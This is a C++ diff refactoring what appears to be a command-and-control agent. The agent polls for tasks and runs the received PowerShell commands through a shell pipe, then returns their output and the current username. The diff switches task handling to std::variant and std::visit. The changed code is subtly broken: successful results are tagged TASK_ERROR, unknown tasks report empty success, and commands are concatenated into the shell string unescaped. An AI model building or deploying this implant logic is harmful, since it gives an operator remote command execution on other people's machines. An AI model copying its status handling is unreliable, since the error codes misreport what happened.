@@ -3,6 +3,7 @@
 #define _WIN32_WINNT 0x0600
 
 #include "Agent.h"
+
 #include <stdio.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -15,10 +16,14 @@
 #include <array>
 #include <cmath>
 #include <cstdio>
+#include <variant>
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
+
+template<class... Ts> struct overloaded : Ts... { using Ts::operator()...; };
+template<class... Ts> overloaded(Ts...) -> overloaded<Ts...>;
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Default constructor
@@ -47,15 +52,18 @@ void Agent::Start()
 
         if (taskManager.HasPendingTask())
         {
-            CheckinResponse task = taskManager.GetNextTask();
-            std::string result;
-            switch (task.type)
-            {
-            case 1:
-                result = ExecutePowerShell(task.powerShellCommand.commandlet);
-                taskManager.StoreTaskResult(task.id, true, result);
-                break;
-            }
+            auto request = taskManager.GetNextTask();
+
+            Response result = std::visit(overloaded{
+                [this](const TaskRequest<CommandPowershell>& psRequest) -> Response {
+                    return this->ExecutePowerShell(psRequest.taskID, psRequest.data);
+                },
+                [](const auto& unhandledRequest) -> Response {
+                    return TaskResponse<TaskSuccess>{ };
+                }
+            }, request);
+
+            taskManager.StoreTaskResult(result);
         }
         Sleep(5000);
     }
@@ -69,28 +77,24 @@ void Agent::Exit()
     ExitProcess(0);
 }
 
-std::string Agent::GetUID() {
+Response Agent::GetUID(const int& taskID, const bool& isTrue) {
     char username[256];
     DWORD username_len = sizeof(username);
     // Get the username of the current user
-    if (GetUserNameA(username, &username_len))
-    {
-        return std::string(username);
-    }
+    GetUserNameA(username, &username_len);
 
-    return std::string();
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ username });
 }
 
-std::string Agent::ExecutePowerShell(const std::string& command)
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+Response Agent::ExecutePowerShell(const int& taskID, const CommandPowershell& psRequest)
 {
-#ifdef _WIN32
-    // Execute PowerShell command and return the output
     std::string result;
-    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
+    std::string psCommand = "powershell.exe -Command \"" + psRequest.commandlet + "\"";
     FILE* pipe = _popen(psCommand.c_str(), "r");
     if (!pipe)
     {
-        return "Error executing PowerShell command.";
+        return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{ 0, "Failed to open process pipe." });
     }
 
     char buffer[128];
@@ -102,11 +106,7 @@ std::string Agent::ExecutePowerShell(const std::string& command)
 
     _pclose(pipe);
 
-    return result;
-#else
-    (void)command; // Suppress unused parameter warning
-    return "PowerShell execution is only supported on Windows.";
-#endif
+    return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskSuccess{ result });
 }
 
 
